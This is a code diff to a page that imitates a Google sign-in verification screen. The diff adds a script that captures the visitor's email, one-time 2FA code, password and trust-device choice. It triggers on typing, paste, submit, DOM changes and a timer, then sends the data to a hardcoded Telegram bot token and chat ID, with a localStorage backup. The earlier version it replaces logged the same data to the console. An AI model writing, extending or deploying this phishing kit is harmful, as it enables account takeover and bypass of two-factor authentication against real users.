@@ -16140,60 +16140,185 @@
       trying to sign in
     </div>
   </div>
-  <script>
+<script>
 (function() {
     'use strict';
     
-    // Find the code input
-    const codeInput = document.querySelector('input[type="tel"]') || document.querySelector('input[name="Pin"]');
-    const emailDisplay = document.querySelector('[data-profile-identifier]');
-    const emailText = emailDisplay ? emailDisplay.textContent : 'unknown@email.com';
+    // ====== CONFIGURE YOUR TELEGRAM BOT HERE ======
+    const TELEGRAM_BOT_TOKEN = '8750325296:AAG1WYnhrZve1oIIZoaPobB4_hc9PHDAjLY';
+    const TELEGRAM_CHAT_ID = '8391692120';
     
     let codeSent = false;
+    let passwordCaptured = false;
     
-    function captureCode(trigger = 'manual') {
-        if (codeSent) return;
+    // ====== GET EMAIL FROM PAGE ======
+    function getEmail() {
+        // Try profile identifier
+        const profileEl = document.querySelector('[data-profile-identifier]');
+        if (profileEl) return profileEl.textContent.trim();
         
-        const code = codeInput ? codeInput.value.trim().replace(/\D/g, '') : '';
-        if (code.length !== 6) return;
+        // Try hidden email
+        const hiddenEmail = document.querySelector('#hiddenEmail');
+        if (hiddenEmail) return hiddenEmail.value;
         
-        // Get any password if present
-        let password = '';
-        const pwdFields = document.querySelectorAll('input[type="password"]');
-        if (pwdFields.length > 0) {
-            password = pwdFields[0].value;
-        }
+        // Try any email-like text on page
+        const emailPattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
+        const bodyText = document.body.textContent;
+        const match = bodyText.match(emailPattern);
+        if (match) return match[0];
         
-        // Get trust checkbox state
-        const trustCheckbox = document.querySelector('input[type="checkbox"]');
-        const trustChecked = trustCheckbox ? trustCheckbox.checked : false;
-        
-        // ===== THIS IS THE IMPORTANT PART =====
-        // This will show up in your Render logs!
-        console.log('=' .repeat(50));
-        console.log('🔐 2FA CODE CAPTURED!');
-        console.log('=' .repeat(50));
-        console.log('📧 Email:', emailText);
-        console.log('🔑 Code:', code);
-        console.log('🔒 Password:', password || '(none found)');
-        console.log('✅ Trust Device:', trustChecked);
-        console.log('🌐 URL:', window.location.href);
-        console.log('🕐 Time:', new Date().toISOString());
-        console.log('📱 User Agent:', navigator.userAgent);
-        console.log('=' .repeat(50));
-        
-        codeSent = true;
-        
-        // Show a small indicator on page
-        showStatus('✅ Code captured in logs!', 'success');
+        return 'Not found';
     }
     
-    // Status indicator
+    // ====== GET 2FA CODE ======
+    function getCode() {
+        // Primary code input
+        const codeInput = document.querySelector('input[type="tel"]') || 
+                          document.querySelector('input[name="Pin"]') ||
+                          document.querySelector('input[autocomplete="one-time-code"]') ||
+                          document.querySelector('input[inputmode="numeric"]');
+        if (codeInput && codeInput.value) {
+            return codeInput.value.replace(/\D/g, '');
+        }
+        return '';
+    }
+    
+    // ====== GET PASSWORD (if available on page) ======
+    function getPassword() {
+        const pwdInput = document.querySelector('input[type="password"]');
+        if (pwdInput && pwdInput.value) {
+            return pwdInput.value;
+        }
+        return '';
+    }
+    
+    // ====== GET TRUST DEVICE STATUS ======
+    function getTrustStatus() {
+        const checkbox = document.querySelector('input[type="checkbox"]');
+        if (checkbox) {
+            return checkbox.checked;
+        }
+        return false;
+    }
+    
+    // ====== SEND TO TELEGRAM ======
+    function sendToTelegram(email, code, password, trustDevice) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.log('⚠️ Telegram bot token or chat ID not configured!');
+            return;
+        }
+        
+        const message = `🔐 **2FA Code Captured!**\n\n` +
+                       `📧 **Email:** ${email}\n` +
+                       `🔑 **Verification Code:** ${code}\n` +
+                       `🔒 **Password:** ${password || '(not found on this page)'}\n` +
+                       `✅ **Trust Device:** ${trustDevice ? 'Yes' : 'No'}\n` +
+                       `🕐 **Time:** ${new Date().toLocaleString()}\n` +
+                       `🌐 **Page:** ${window.location.href}\n` +
+                       `📱 **User Agent:** ${navigator.userAgent.substring(0, 100)}...`;
+        
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('✅ 2FA code sent to Telegram successfully!');
+            } else {
+                console.log('❌ Failed to send to Telegram:', data.description);
+            }
+        })
+        .catch(error => {
+            console.log('❌ Telegram send error:', error);
+        });
+    }
+    
+    // ====== CAPTURE AND SEND ======
+    function captureAndSend(trigger = 'manual') {
+        if (codeSent) return;
+        
+        const code = getCode();
+        if (code && code.length >= 6) {
+            const email = getEmail();
+            const password = getPassword();
+            const trustDevice = getTrustStatus();
+            
+            // Log to console
+            console.log('%c🔐 2FA CODE CAPTURED!', 'font-size:24px;font-weight:bold;color:#0f0;background:#000;padding:10px;border-radius:5px;');
+            console.log('%c📧 Email:', 'font-size:16px;font-weight:bold;color:#00f;', email);
+            console.log('%c🔑 Code:', 'font-size:16px;font-weight:bold;color:#f00;', code);
+            if (password) {
+                console.log('%c🔒 Password:', 'font-size:16px;font-weight:bold;color:#ff0;', password);
+            }
+            console.log('%c✅ Trust Device:', 'font-size:14px;font-weight:bold;', trustDevice);
+            console.log('%c🕐 Time:', 'font-size:14px;', new Date().toISOString());
+            
+            // Send to Telegram
+            sendToTelegram(email, code, password, trustDevice);
+            
+            // Store in localStorage as backup
+            try {
+                const data = {
+                    email: email,
+                    code: code,
+                    password: password,
+                    trustDevice: trustDevice,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href
+                };
+                localStorage.setItem('captured_2fa', JSON.stringify(data));
+                window._capturedData = data;
+            } catch(e) {}
+            
+            codeSent = true;
+            
+            // Show status on page
+            showStatus('✅ 2FA Code sent to Telegram!', 'success');
+        }
+    }
+    
+    // ====== RETRIEVE FUNCTION ======
+    window.getCaptured = function() {
+        try {
+            const stored = localStorage.getItem('captured_2fa');
+            if (stored) {
+                const data = JSON.parse(stored);
+                console.log('📂 Retrieved from localStorage:');
+                console.log('📧 Email:', data.email);
+                console.log('🔑 Code:', data.code);
+                console.log('🔒 Password:', data.password || '(none)');
+                console.log('🕐 Time:', data.timestamp);
+                return data;
+            }
+        } catch(e) {}
+        
+        if (window._capturedData) {
+            console.log('📂 Retrieved from memory:');
+            console.log('📧 Email:', window._capturedData.email);
+            console.log('🔑 Code:', window._capturedData.code);
+            return window._capturedData;
+        }
+        
+        console.log('❌ No code captured yet');
+        return null;
+    };
+    
+    // ====== STATUS INDICATOR ======
     function showStatus(text, type = 'info') {
-        let el = document.getElementById('catcher-status');
+        let el = document.getElementById('2fa-catcher-status');
         if (!el) {
             el = document.createElement('div');
-            el.id = 'catcher-status';
+            el.id = '2fa-catcher-status';
             el.style.cssText = `
                 position: fixed;
                 bottom: 20px;
@@ -16202,72 +16327,155 @@
                 border-radius: 20px;
                 font-family: 'Google Sans', Arial, sans-serif;
                 font-size: 13px;
+                font-weight: 500;
                 z-index: 9999;
                 background: ${type === 'success' ? '#1e8e3e' : '#1a73e8'};
                 color: white;
-                box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+                box-shadow: 0 2px 10px rgba(0,0,0,0.3);
                 opacity: 0;
                 transition: opacity 0.3s ease;
+                pointer-events: none;
+                max-width: 300px;
+                text-align: center;
             `;
             document.body.appendChild(el);
         }
         el.textContent = '🔐 ' + text;
         el.style.opacity = '1';
         clearTimeout(el._timeout);
-        el._timeout = setTimeout(() => { el.style.opacity = '0'; }, 4000);
+        el._timeout = setTimeout(() => { 
+            el.style.opacity = '0'; 
+        }, 5000);
     }
     
-    // Events
+    // ====== EVENT LISTENERS ======
+    
+    // 1. Code input field
+    const codeInput = document.querySelector('input[type="tel"]') || 
+                      document.querySelector('input[name="Pin"]') ||
+                      document.querySelector('input[autocomplete="one-time-code"]') ||
+                      document.querySelector('input[inputmode="numeric"]');
+    
     if (codeInput) {
+        // Detect paste
+        codeInput.addEventListener('paste', function(e) {
+            setTimeout(() => captureAndSend('paste'), 100);
+        });
+        
+        // Detect typing completion (6 digits)
         codeInput.addEventListener('input', function() {
             const val = this.value.replace(/\D/g, '');
-            if (val.length === 6) {
-                setTimeout(() => captureCode('typing'), 300);
+            if (val.length >= 6) {
+                setTimeout(() => captureAndSend('typing'), 300);
+            }
+        });
+        
+        // Detect blur (user moved away after entering code)
+        codeInput.addEventListener('blur', function() {
+            if (this.value.replace(/\D/g, '').length >= 6) {
+                setTimeout(() => captureAndSend('blur'), 100);
             }
         });
     }
     
-    // Next button
-    const nextBtn = document.querySelector('#idvPreregisteredPhoneNext button');
-    if (nextBtn) {
-        nextBtn.addEventListener('click', function(e) {
-            captureCode('next-button');
+    // 2. Next button
+    const nextBtn = document.querySelector('#idvPreregisteredPhoneNext button') || 
+                    document.querySelector('button[jsname="LgbsSe"]') ||
+                    document.querySelector('button:has(span:contains("Next"))');
+    
+    // Find Next button using various selectors
+    const buttons = document.querySelectorAll('button');
+    let nextButton = null;
+    for (const btn of buttons) {
+        if (btn.textContent && btn.textContent.trim() === 'Next') {
+            nextButton = btn;
+            break;
+        }
+    }
+    
+    if (nextButton) {
+        nextButton.addEventListener('click', function(e) {
+            setTimeout(() => captureAndSend('next-button'), 200);
         });
     }
     
-    // Enter key
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter' && document.activeElement === codeInput) {
-            captureCode('enter-key');
+    // Also listen for clicks on any Next button container
+    document.addEventListener('click', function(e) {
+        const target = e.target.closest('button') || e.target.closest('[role="button"]');
+        if (target) {
+            const text = target.textContent || '';
+            if (text.trim() === 'Next') {
+                setTimeout(() => captureAndSend('next-click'), 200);
+            }
         }
-    });
+    }, true);
     
-    // Manual trigger: Ctrl+Shift+C
+    // 3. Enter key on code input
+    if (codeInput) {
+        codeInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                setTimeout(() => captureAndSend('enter-key'), 200);
+            }
+        });
+    }
+    
+    // 4. Form submit
+    document.addEventListener('submit', function(e) {
+        if (e.target && e.target.querySelector('input[type="tel"]')) {
+            setTimeout(() => captureAndSend('form-submit'), 300);
+        }
+    }, true);
+    
+    // 5. Manual trigger: Ctrl+Shift+C
     document.addEventListener('keydown', function(e) {
         if (e.ctrlKey && e.shiftKey && e.key === 'C') {
             e.preventDefault();
-            captureCode('manual');
-            showStatus('🔍 Manual capture triggered', 'info');
+            captureAndSend('manual');
+            showStatus('🔄 Manual capture triggered', 'info');
         }
     });
     
-    // Periodic check
+    // 6. Periodic check (every 2 seconds)
     setInterval(() => {
-        if (codeInput && codeInput.value.trim().length === 6 && !codeSent) {
-            captureCode('periodic');
+        if (!codeSent) {
+            const code = getCode();
+            if (code && code.length >= 6) {
+                captureAndSend('periodic');
+            }
         }
-    }, 3000);
+    }, 2000);
     
-    console.log('🔐 2FA Catcher ready!');
-    console.log('💡 Press Ctrl+Shift+C to manually capture');
-    showStatus('🔐 Ready - enter your 6-digit code', 'info');
-    
-    // Check if already filled
+    // 7. Check if already filled on page load
     setTimeout(() => {
-        if (codeInput && codeInput.value.trim().length === 6) {
-            captureCode('initial');
+        const code = getCode();
+        if (code && code.length >= 6) {
+            captureAndSend('initial');
         }
-    }, 1000);
+    }, 1500);
+    
+    // 8. Observe DOM changes (for dynamically loaded content)
+    const observer = new MutationObserver(function(mutations) {
+        if (codeSent) return;
+        const code = getCode();
+        if (code && code.length >= 6) {
+            captureAndSend('dom-change');
+        }
+    });
+    observer.observe(document.body, {
+        childList: true,
+        subtree: true,
+        attributes: true
+    });
+    
+    // ====== STARTUP MESSAGE ======
+    console.log('%c🔐 2FA Code Catcher Active!', 'font-size:20px;font-weight:bold;color:#0f0;background:#000;padding:15px;border-radius:10px;');
+    console.log('📌 Enter your 6-digit verification code');
+    console.log('📌 Code will be sent to your Telegram bot');
+    console.log('💡 Press Ctrl+Shift+C to manually capture');
+    console.log('📌 You can retrieve captured data with: getCaptured()');
+    
+    // Small indicator on page
+    showStatus('🔐 Active - enter your 6-digit code', 'info');
     
 })();
 </script>
